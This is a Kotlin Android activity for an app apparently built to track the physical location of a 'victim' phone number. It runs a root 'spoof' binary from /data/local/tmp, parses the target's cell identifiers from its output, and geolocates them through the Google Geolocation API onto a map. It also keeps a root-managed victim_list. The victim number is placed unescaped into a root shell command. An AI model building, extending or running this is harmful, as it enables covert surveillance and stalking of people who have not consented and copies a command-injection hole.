package com.example.cellidtracker

import android.os.Bundle
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.activity.compose.rememberLauncherForActivityResult
import androidx.activity.result.contract.ActivityResultContracts
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.rememberScrollState
import androidx.compose.foundation.verticalScroll
import androidx.compose.material3.*
import androidx.compose.material3.DropdownMenu
import androidx.compose.material3.DropdownMenuItem
import androidx.compose.runtime.*
import androidx.compose.ui.Modifier
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.unit.dp
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import org.json.JSONObject
import java.time.Instant
import java.time.ZoneId
import java.time.format.DateTimeFormatter
import androidx.compose.runtime.LaunchedEffect

// 從 report JSON 裡解析到的 cell 參數
data class CellIdParams(
    val mcc: Int,
    val mnc: Int,
    val lac: Int,
    val cid: Int
)

data class ParsedCellFromLog(
    val mcc: Int,
    val mnc: Int,
    val lac: Int,
    val cid: Int
)

private fun tryParseCellFromStdoutLine(
    line: String,
    acc: MutableMap<String, Int>
): ParsedCellFromLog? {
    // 切 "key: value"
    val parts = line.split(':', limit = 2)
    if (parts.size != 2) return null

    val key = parts[0].trim().lowercase()
    val valueStr = parts[1].trim()
    val value = valueStr.toIntOrNull() ?: return null

    when (key) {
        "mcc"    -> acc["mcc"] = value
        "mnc"    -> acc["mnc"] = value
        "lac"    -> acc["lac"] = value
        "cellid" -> acc["cellid"] = value
    }

    val mcc = acc["mcc"]
    val mnc = acc["mnc"]
    val lac = acc["lac"]
    val cid = acc["cellid"]

    return if (mcc != null && mnc != null && lac != null && cid != null) {
        ParsedCellFromLog(mcc, mnc, lac, cid)
    } else {
        null
    }
}



private fun extractIntCandidate(obj: JSONObject, vararg names: String): Int? {
    for (name in names) {
        if (obj.has(name)) {
            // optInt 找不到會回 0，有些 field 本來就可能是 0，所以改成先拿字串再轉
            val raw = obj.opt(name)?.toString() ?: continue
            val v = raw.toIntOrNull()
            if (v != null) return v
        }
    }
    return null
}

/**
 * 嘗試從 report JSON 中找出 mcc/mnc/lac/cid。
 * 會先看是否有 "cell" / "cellInfo" / "cellular" 物件，否則就用 root 查。
 */
private fun extractCellParams(root: JSONObject): CellIdParams? {
    val cellObj: JSONObject = when {
        root.has("cell") -> root.optJSONObject("cell") ?: root
        root.has("cellInfo") -> root.optJSONObject("cellInfo") ?: root
        root.has("cellular") -> root.optJSONObject("cellular") ?: root
        else -> root
    }

    val mcc = extractIntCandidate(cellObj, "mcc", "MCC", "mobileCountryCode")
    val mnc = extractIntCandidate(cellObj, "mnc", "MNC", "mobileNetworkCode")
    val lac = extractIntCandidate(cellObj, "lac", "LAC", "tac", "TAC", "area", "areaCode")
    val cid = extractIntCandidate(cellObj, "cid", "CID", "cellId", "cell", "cellid")

    return if (mcc != null && mnc != null && lac != null && cid != null) {
        CellIdParams(mcc, mnc, lac, cid)
    } else {
        null
    }
}

class MainActivity : ComponentActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        setContent {
            MaterialTheme {
                val ctx = LocalContext.current
                val scope = rememberCoroutineScope()
                val screenScrollState = rememberScrollState()

                // UI state
                var input by remember { mutableStateOf("") }
                var output by remember { mutableStateOf("結果會顯示在這裡") }
                var carrier by remember { mutableStateOf("UNKNOWN") }
                var carrierMenu by remember { mutableStateOf(false) }
                var isRootRunning by remember { mutableStateOf(false) }
                var userStopRequested by remember { mutableStateOf(false) }
                var cellLocation by remember { mutableStateOf<CellLocationResult?>(null) }

                var mccInput by remember { mutableStateOf("") }
                var mncInput by remember { mutableStateOf("") }
                var lacInput by remember { mutableStateOf("") }
                var cidInput by remember { mutableStateOf("") }

                // 手動輸入經緯度測試地圖
                var manualLatInput by remember { mutableStateOf("") }
                var manualLonInput by remember { mutableStateOf("") }

                // 從 ORIGINAL(root) stdout 抓到的最新 cell 參數
                var lastStdoutMcc by remember { mutableStateOf<Int?>(null) }
                var lastStdoutMnc by remember { mutableStateOf<Int?>(null) }
                var lastStdoutLac by remember { mutableStateOf<Int?>(null) }
                var lastStdoutCid by remember { mutableStateOf<Int?>(null) }

                // 避免同一個 cellId 一直重複打 API
                var lastQueriedCid by remember { mutableStateOf<Int?>(null) }

                // Permission launchers
                val phonePermLauncher = rememberLauncherForActivityResult(
                    ActivityResultContracts.RequestMultiplePermissions()
                ) { _ ->
                    carrier = CarrierProbe.getCarrierNameOrUnknown(ctx)
                }
                val locPermLauncher = rememberLauncherForActivityResult(
                    ActivityResultContracts.RequestMultiplePermissions()
                ) { _ -> /* no-op */ }

                fun ensureLocationPermission() {
                    if (Perms.missingAny(ctx, Perms.LOC_PERMS)) {
                        locPermLauncher.launch(Perms.LOC_PERMS)
                    }
                }

                fun requestPhoneStateIfNeeded() {
                    if (Perms.missingAny(ctx, Perms.PHONE_PERMS)) {
                        phonePermLauncher.launch(Perms.PHONE_PERMS)
                    } else {
                        carrier = CarrierProbe.getCarrierNameOrUnknown(ctx)
                    }
                }

                Column(
                    modifier = Modifier
                        .fillMaxSize()
                        .padding(16.dp)
                ) {
                    // 上半：可捲動內容（所有輸入、按鈕、output）
                    Column(
                        modifier = Modifier
                            .weight(1f)
                            .fillMaxWidth()
                            .verticalScroll(screenScrollState)
                    ) {

                        OutlinedTextField(
                            value = input,
                            onValueChange = { input = it },
                            label = { Text("Victim number / 任意文字") },
                            modifier = Modifier.fillMaxWidth()
                        )

                        Spacer(Modifier.height(12.dp))

                        // Carrier block
                        Text("Carrier: $carrier")
                        Row(
                            Modifier.fillMaxWidth(),
                            horizontalArrangement = Arrangement.spacedBy(8.dp)
                        ) {
                            Button(
                                onClick = {
                                    ensureLocationPermission()
                                    requestPhoneStateIfNeeded()
                                },
                                modifier = Modifier.weight(1f)
                            ) { Text("取得/更新電信商") }

                            Box(Modifier.weight(1f)) {
                                Button(
                                    onClick = { carrierMenu = true },
                                    modifier = Modifier.fillMaxWidth()
                                ) {
                                    Text("手動選擇")
                                }
                                DropdownMenu(
                                    expanded = carrierMenu,
                                    onDismissRequest = { carrierMenu = false }
                                ) {
                                    listOf("TWM","CHT","FET","GT","TWN","UNKNOWN").forEach { name ->
                                        DropdownMenuItem(
                                            text = { Text(name) },
                                            onClick = {
                                                carrier = name
                                                carrierMenu = false
                                            }
                                        )
                                    }
                                }
                            }
                        }

                        Spacer(Modifier.height(12.dp))

                        Row(
                            Modifier.fillMaxWidth(),
                            horizontalArrangement = Arrangement.spacedBy(8.dp)
                        ) {
                            // Run report (Wi-Fi + Carrier + assets config)
                            Button(
                                onClick = {
                                    scope.launch {
                                        ensureLocationPermission()
                                        val w = DeviceProbe.getWifiInfo(ctx)

                                        // 若 carrier 仍 UNKNOWN，再嘗試一次取系統值（不強制權限彈窗）
                                        val currentCarrier =
                                            if (carrier == "UNKNOWN")
                                                CarrierProbe.getCarrierNameOrUnknown(ctx)
                                            else
                                                carrier

                                        // JNI 呼叫丟到 IO 線程
                                        val raw = withContext(Dispatchers.IO) {
                                            NativeBridge.runReportWithConfig(
                                                input,
                                                w.enabled,
                                                w.ssid,
                                                currentCarrier,
                                                AssetConfig.dumpAllAsJson(ctx)
                                            )
                                        }

                                        try {
                                            val o = JSONObject(raw)
                                            val wifi = o.getJSONObject("wifi")
                                            val ims  = o.getJSONObject("ims")
                                            val registered = ims.optBoolean("registered", false)
                                            val rat        = ims.optString("rat", "UNKNOWN")

                                            val ts = o.getLong("ts")
                                            val formatter =
                                                DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss")
                                            val lastAssess = Instant.ofEpochSecond(ts)
                                                .atZone(ZoneId.of("Asia/Taipei"))
                                                .format(formatter)

                                            val cfgJson = AssetConfig.dumpAllAsJson(ctx)
                                            val cfgObj = JSONObject(cfgJson)
                                            val cfgSummary = cfgObj.getJSONObject("summary")
                                            val carriersObj = cfgObj.getJSONObject("carriers")
                                            val carrierCount = cfgSummary.getInt("carrierCount")
                                            val fileCount = cfgSummary.getInt("fileCount")
                                            val carrierNames =
                                                carriersObj.keys().asSequence().toList()
                                            val configSummaryPretty = buildString {
                                                append("profiles=")
                                                append(carrierCount)
                                                append(" [")
                                                append(carrierNames.joinToString(","))
                                                append("], files=")
                                                append(fileCount)
                                            }

                                            var text = """
                                                victim: ${o.getString("victim")}
                                                carrier: ${o.getString("carrier")}
                                                wifi.enabled: ${wifi.getBoolean("enabled")}
                                                wifi.ssid: ${wifi.getString("ssid")}
                                                ims.registered: $registered
                                                ims.rat: $rat
                                                last assess (GMT+8): $lastAssess
                                                configSummary: $configSummaryPretty
                                            """.trimIndent()

                                            // 嘗試從 report JSON 抓出 cell 參數
                                            val cellParams = extractCellParams(o)
                                            if (cellParams != null) {
                                                mccInput = cellParams.mcc.toString()
                                                mncInput = cellParams.mnc.toString()
                                                lacInput = cellParams.lac.toString()
                                                cidInput = cellParams.cid.toString()

                                                text += """
                                                    
                                                    
                                                    [Cell parsed from report]
                                                    mcc=${cellParams.mcc}, mnc=${cellParams.mnc}, lac=${cellParams.lac}, cid=${cellParams.cid}
                                                """.trimIndent()

                                                // 自動打 Google Geolocation API，更新地圖
                                                val geoResult = withContext(Dispatchers.IO) {
                                                    GoogleGeolocationClient.queryByCell(
                                                        mcc = cellParams.mcc,
                                                        mnc = cellParams.mnc,
                                                        lac = cellParams.lac,
                                                        cellId = cellParams.cid,
                                                        // radioType 可以之後再從 report 推得，目前先假設 LTE
                                                        radioType = "lte"
                                                    )
                                                }

                                                val geoText = geoResult.fold(
                                                    onSuccess = { loc ->
                                                        cellLocation = loc
                                                        buildString {
                                                            appendLine()
                                                            appendLine()
                                                            appendLine("[Google Geolocation]")
                                                            appendLine("lat=${loc.lat}, lon=${loc.lon}")
                                                            if (loc.range != null) {
                                                                appendLine("accuracy=${loc.range} m")
                                                            }
                                                        }
                                                    },
                                                    onFailure = { e ->
                                                        cellLocation = null
                                                        "\n\n[Google Geolocation] 查詢失敗：${e.message ?: e.toString()}"
                                                    }
                                                )

                                                text += geoText
                                            } else {
                                                // 沒抓到 cell，就清掉地圖座標
                                                cellLocation = null
                                                text += "\n\n[Cell] 無法從 report JSON 自動解析 mcc/mnc/lac/cid。"
                                            }

                                            output = text
                                        } catch (e: Exception) {
                                            cellLocation = null
                                            output = "parse error: ${e.message}\nraw=$raw"
                                        }
                                    }
                                },
                                modifier = Modifier.weight(1f)
                            ) { Text("Run report") }
                        }

                        Spacer(Modifier.height(12.dp))

                        // ==== 手動查：輸入 MCC/MNC/LAC/CID → 呼叫 Google Geolocation ====
                        Spacer(Modifier.height(16.dp))

                        Text("OpenCellID 手動查詢 (mcc, mnc, lac, cellId)")

                        Spacer(Modifier.height(8.dp))

                        // 先放兩欄：MCC / MNC
                        Row(
                            modifier = Modifier.fillMaxWidth(),
                            horizontalArrangement = Arrangement.spacedBy(8.dp)
                        ) {
                            OutlinedTextField(
                                value = mccInput,
                                onValueChange = { mccInput = it },
                                label = { Text("MCC") },
                                modifier = Modifier.weight(1f)
                            )
                            OutlinedTextField(
                                value = mncInput,
                                onValueChange = { mncInput = it },
                                label = { Text("MNC") },
                                modifier = Modifier.weight(1f)
                            )
                        }

                        // 再放兩欄：LAC / Cell ID
                        Spacer(Modifier.height(8.dp))

                        Row(
                            modifier = Modifier.fillMaxWidth(),
                            horizontalArrangement = Arrangement.spacedBy(8.dp)
                        ) {
                            OutlinedTextField(
                                value = lacInput,
                                onValueChange = { lacInput = it },
                                label = { Text("LAC / TAC") },
                                modifier = Modifier.weight(1f)
                            )
                            OutlinedTextField(
                                value = cidInput,
                                onValueChange = { cidInput = it },
                                label = { Text("Cell ID") },
                                modifier = Modifier.weight(1f)
                            )
                        }

                        Spacer(Modifier.height(8.dp))

                        Button(
                            onClick = {
                                val mccStr = mccInput.trim()
                                val mncStr = mncInput.trim()
                                val lacStr = lacInput.trim()
                                val cidStr = cidInput.trim()

                                if (mccStr.isEmpty() || mncStr.isEmpty() || lacStr.isEmpty() || cidStr.isEmpty()) {
                                    output = "請先把 MCC, MNC, LAC, Cell ID 都填寫再查詢。"
                                    cellLocation = null
                                } else {
                                    val mcc = mccStr.toIntOrNull()
                                    val mnc = mncStr.toIntOrNull()
                                    val lac = lacStr.toIntOrNull()
                                    val cid = cidStr.toIntOrNull()

                                    if (mcc == null || mnc == null || lac == null || cid == null) {
                                        output = "MCC/MNC/LAC/Cell ID 必須都是整數（十進位）。"
                                        cellLocation = null
                                    } else {
                                        // 開始真正查詢
                                        scope.launch {
                                            output = buildString {
                                                appendLine("查詢 Google Geolocation 中...")
                                                appendLine("mcc=$mcc, mnc=$mnc, lac=$lac, cellId=$cid")
                                            }

                                            val result = withContext(Dispatchers.IO) {
                                                GoogleGeolocationClient.queryByCell(
                                                    mcc = mcc,
                                                    mnc = mnc,
                                                    lac = lac,
                                                    cellId = cid,
                                                    radioType = "lte"
                                                )
                                            }

                                            output = result.fold(
                                                onSuccess = { loc ->
                                                    cellLocation = loc
                                                    buildString {
                                                        appendLine("Google Geolocation 查詢成功：")
                                                        appendLine("lat=${loc.lat}, lon=${loc.lon}")
                                                        if (loc.range != null) {
                                                            appendLine("accuracy=${loc.range} m")
                                                        }
                                                    }
                                                },
                                                onFailure = { e ->
                                                    cellLocation = null
                                                    "Google Geolocation 查詢失敗：${e.message ?: e.toString()}"
                                                }
                                            )
                                        }
                                    }
                                }
                            },
                            modifier = Modifier.fillMaxWidth()
                        ) {
                            Text("用 OpenCellID 查 Cell 位置")
                        }

                        Spacer(Modifier.height(12.dp))
                        // ==== 手動查區塊結束 ====

                        // ORIGINAL flow：root CLI 版，呼叫 /data/local/tmp/spoof
                        Row(
                            Modifier.fillMaxWidth(),
                            horizontalArrangement = Arrangement.spacedBy(8.dp)
                        ) {
                            Button(
                                onClick = {
                                    val currentCarrier =
                                        if (carrier == "UNKNOWN")
                                            CarrierProbe.getCarrierNameOrUnknown(ctx)
                                        else
                                            carrier

                                    isRootRunning = true
                                    userStopRequested = false

                                    scope.launch {
                                        val cmd =
                                            "cd /data/local/tmp && ./spoof -r -d --verbose 1"

                                        output = buildString {
                                            appendLine("Running ORIGINAL (root)...")
                                            appendLine("Command:")
                                            appendLine(cmd)
                                            appendLine()
                                            appendLine("----- STDOUT (stream) -----")
                                        }

                                    val exitCode = withContext(Dispatchers.IO) {
                                        RootShell.runAsRootStreaming(
                                            command = cmd,
                                            onStdoutLine = { line ->
                                                // 1. 先把原始輸出加到 output
                                                output += "\n$line"

                                                // 2. 嘗試解析 mcc/mnc/lac/cellid
                                                val trimmed = line.trim()

                                                when {
                                                    trimmed.startsWith("mcc:") -> {
                                                        trimmed.removePrefix("mcc:")
                                                            .trim()
                                                            .toIntOrNull()
                                                            ?.let { lastStdoutMcc = it }
                                                    }
                                                    trimmed.startsWith("mnc:") -> {
                                                        trimmed.removePrefix("mnc:")
                                                            .trim()
                                                            .toIntOrNull()
                                                            ?.let { lastStdoutMnc = it }
                                                    }
                                                    trimmed.startsWith("lac:") -> {
                                                        trimmed.removePrefix("lac:")
                                                            .trim()
                                                            .toIntOrNull()
                                                            ?.let { lastStdoutLac = it }
                                                    }
                                                    trimmed.startsWith("cellid:") -> {
                                                        trimmed.removePrefix("cellid:")
                                                            .trim()
                                                            .toIntOrNull()
                                                            ?.let { cidValue ->
                                                                lastStdoutCid = cidValue

                                                                val mccVal = lastStdoutMcc
                                                                val mncVal = lastStdoutMnc
                                                                val lacVal = lastStdoutLac

                                                                // 四個都有值，而且不是已經查過的同一個 cellId，就打一次 API
                                                                if (mccVal != null && mncVal != null && lacVal != null &&
                                                                    cidValue != lastQueriedCid
                                                                ) {
                                                                    lastQueriedCid = cidValue

                                                                    // 3. 啟動一個 coroutine 去查 Google Geolocation
                                                                    scope.launch {
                                                                        // 顯示一下正在查
                                                                        output += """
                                                                            
                                                                            [Geo] querying Google Geolocation...
                                                                            mcc=$mccVal, mnc=$mncVal, lac=$lacVal, cellId=$cidValue
                                                                        """.trimIndent()

                                                                        val result = withContext(Dispatchers.IO) {
                                                                            GoogleGeolocationClient.queryByCell(
                                                                                mcc = mccVal,
                                                                                mnc = mncVal,
                                                                                lac = lacVal,
                                                                                cellId = cidValue,
                                                                                radioType = "lte" // 目前先假設 LTE，有需要可以改成從 report / ims 判斷
                                                                            )
                                                                        }

                                                                        output += result.fold(
                                                                            onSuccess = { loc ->
                                                                                // 更新地圖座標
                                                                                cellLocation = loc

                                                                                buildString {
                                                                                    appendLine()
                                                                                    appendLine("[Google Geolocation] success")
                                                                                    appendLine("lat=${loc.lat}, lon=${loc.lon}")
                                                                                    if (loc.range != null) {
                                                                                        appendLine("accuracy=${loc.range} m")
                                                                                    }
                                                                                }
                                                                            },
                                                                            onFailure = { e ->
                                                                                cellLocation = null
                                                                                "\n[Google Geolocation] 查詢失敗：${e.message ?: e.toString()}"
                                                                            }
                                                                        )
                                                                    }
                                                                }
                                                            }
                                                    }
                                                }
                                            },
                                            onStderrLine = { line ->
                                                output += "\n[ERR] $line"
                                            }
                                        )
                                    }
                                        output += buildString {
                                            appendLine()
                                            appendLine()
                                            appendLine("----- PROCESS DONE -----")
                                            appendLine("Exit code: $exitCode")
                                            if (userStopRequested) {
                                                appendLine("(Stopped by user)")
                                            }
                                        }

                                        isRootRunning = false
                                    }
                                },
                                modifier = Modifier.weight(1f)
                            ) { Text("Run ORIGINAL (root)") }
                        }

                        Spacer(Modifier.height(12.dp))

                        Row(
                            Modifier.fillMaxWidth(),
                            horizontalArrangement = Arrangement.spacedBy(8.dp)
                        ) {
                            // 左邊：echo victim_list
                            Button(
                                onClick = {
                                    scope.launch {
                                        val path = "/data/local/tmp/victim_list"

                                        val cmd =
                                            "if [ -f \"$path\" ]; then cat \"$path\"; else echo \"victim_list not found at $path\"; fi"

                                        val result = withContext(Dispatchers.IO) {
                                            RootShell.runAsRoot(cmd)
                                        }

                                        output = buildString {
                                            appendLine("Command:")
                                            appendLine(cmd)
                                            appendLine()
                                            appendLine("Exit code: ${result.exitCode}")
                                            appendLine()
                                            appendLine("----- victim_list -----")
                                            appendLine(result.stdout.ifBlank { "(empty)" })
                                            appendLine()
                                            appendLine("----- STDERR -----")
                                            appendLine(result.stderr.ifBlank { "(empty)" })
                                        }
                                    }
                                },
                                modifier = Modifier.weight(1f)
                            ) {
                                Text("Echo victim_list")
                            }

                            // 右邊：把上面 input 加到 victim_list
                            Button(
                                onClick = {
                                    val victimNum = input.trim()
                                    if (victimNum.isEmpty()) {
                                        output = "請先在上方輸入 victim number 再新增到 victim_list"
                                    } else {
                                        scope.launch {
                                            val path = "/data/local/tmp/config/CHT/victim_list"
                                            val cmd = "echo \"$victimNum\" >> \"$path\""

                                            val appendResult = withContext(Dispatchers.IO) {
                                                RootShell.runAsRoot(cmd)
                                            }

                                            val catCmd = "cat \"$path\""
                                            val catResult = withContext(Dispatchers.IO) {
                                                RootShell.runAsRoot(catCmd)
                                            }

                                            output = buildString {
                                                appendLine("Append command:")
                                                appendLine(cmd)
                                                appendLine("Exit code: ${appendResult.exitCode}")
                                                appendLine()
                                                appendLine("----- victim_list (after append) -----")
                                                appendLine(catResult.stdout.ifBlank { "(empty)" })
                                                appendLine()
                                                appendLine("----- STDERR (append) -----")
                                                appendLine(appendResult.stderr.ifBlank { "(empty)" })
                                                appendLine()
                                                appendLine("----- STDERR (cat) -----")
                                                appendLine(catResult.stderr.ifBlank { "(empty)" })
                                            }
                                        }
                                    }
                                },
                                modifier = Modifier.weight(1f)
                            ) {
                                Text("新增到 victim_list")
                            }
                        }

                        Spacer(Modifier.height(8.dp))

                        Button(
                            onClick = {
                                userStopRequested = true
                                RootShell.requestStop()
                                output += "\n\n[Stop requested, waiting for process to terminate...]"
                            },
                            enabled = isRootRunning,
                            modifier = Modifier.fillMaxWidth()
                        ) {
                            Text("Stop ORIGINAL (root)")
                        }

                        // 測試用 button（fake cell）
                        Button(
                            onClick = {
                                scope.launch {
                                    val testMcc = 466
                                    val testMnc = 92
                                    val testLac = 13700
                                    val testCid = 123123213

                                    output = "Querying Geolocation...\n" +
                                            "mcc=$testMcc, mnc=$testMnc, lac=$testLac, cid=$testCid"

                                    val result = withContext(Dispatchers.IO) {
                                        GoogleGeolocationClient.queryByCell(
                                            mcc = testMcc,
                                            mnc = testMnc,
                                            lac = testLac,
                                            cellId = testCid,
                                            radioType = "lte"
                                        )
                                    }

                                    output = result.fold(
                                        onSuccess = { loc ->
                                            cellLocation = loc
                                            buildString {
                                                appendLine("Google Geolocation 查詢成功：")
                                                appendLine("lat=${loc.lat}, lon=${loc.lon}")
                                                if (loc.range != null) {
                                                    appendLine("accuracy=${loc.range} m")
                                                }
                                            }
                                        },
                                        onFailure = { e ->
                                            cellLocation = null
                                            "Google Geolocation 查詢失敗：${e.message}"
                                        }
                                    )
                                }
                            },
                            modifier = Modifier.fillMaxWidth()
                        ) {
                            Text("Test OpenCellID (fake cell)")
                        }

                        Spacer(Modifier.height(12.dp))

                        Text(output)
                    }

                    // ==== 手動輸入經緯度測試地圖 ====
                    Spacer(Modifier.height(16.dp))
                    Divider()
                    Spacer(Modifier.height(8.dp))

                    Text("手動測試經緯度（直接在地圖上顯示）")

                    Spacer(Modifier.height(8.dp))

                    Row(
                        modifier = Modifier.fillMaxWidth(),
                        horizontalArrangement = Arrangement.spacedBy(8.dp)
                    ) {
                        OutlinedTextField(
                            value = manualLatInput,
                            onValueChange = { manualLatInput = it },
                            label = { Text("緯度 lat (-90 ~ 90)") },
                            modifier = Modifier.weight(1f)
                        )
                        OutlinedTextField(
                            value = manualLonInput,
                            onValueChange = { manualLonInput = it },
                            label = { Text("經度 lon (-180 ~ 180)") },
                            modifier = Modifier.weight(1f)
                        )
                    }

                    Spacer(Modifier.height(8.dp))

                    Button(
                        onClick = {
                            val lat = manualLatInput.trim().toDoubleOrNull()
                            val lon = manualLonInput.trim().toDoubleOrNull()

                            if (lat == null || lon == null) {
                                output = "經緯度必須是數字（例如：25.0330, 121.5654）。"
                                cellLocation = null
                            } else if (lat !in -90.0..90.0 || lon !in -180.0..180.0) {
                                output = "緯度必須在 -90~90，經度必須在 -180~180。"
                                cellLocation = null
                            } else {
                                cellLocation = CellLocationResult(
                                    lat = lat,
                                    lon = lon,
                                    range = null
                                )

                                output = buildString {
                                    appendLine("已使用手動經緯度更新地圖：")
                                    appendLine("lat=$lat, lon=$lon")
                                }
                            }
                        },
                        modifier = Modifier.fillMaxWidth()
                    ) {
                        Text("在地圖上顯示這個座標")
                    }

                    // 下半：固定顯示地圖
                    Spacer(Modifier.height(16.dp))

                    Text("Cell location on map (if available):")

                    Box(
                        modifier = Modifier
                            .fillMaxWidth()
                            .height(200.dp)
                    ) {
                        CellMapView(
                            lat = cellLocation?.lat,
                            lon = cellLocation?.lon
                        )
                    }
                }

                // 進入畫面先嘗試一次（不會自動彈權限）
                LaunchedEffect(Unit) {
                    carrier = CarrierProbe.getCarrierNameOrUnknown(ctx)
                }
            }
        }
    }
}
